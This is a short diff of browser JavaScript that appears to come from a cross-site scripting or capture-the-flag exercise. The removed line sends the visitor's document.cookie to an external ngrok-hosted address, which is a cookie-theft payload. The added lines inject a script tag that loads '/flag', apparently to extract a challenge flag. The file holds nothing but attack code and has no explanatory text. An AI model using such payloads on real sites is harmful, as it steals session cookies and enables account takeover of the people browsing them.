@@ -1,1 +1,3 @@
-location = "https://radiological-myriam-balancedly.ngrok-free.dev/?c=" + document.cookie;
+var s = document.createElement('script');
+s.src = "/flag";
+document.body.appendChild(s);
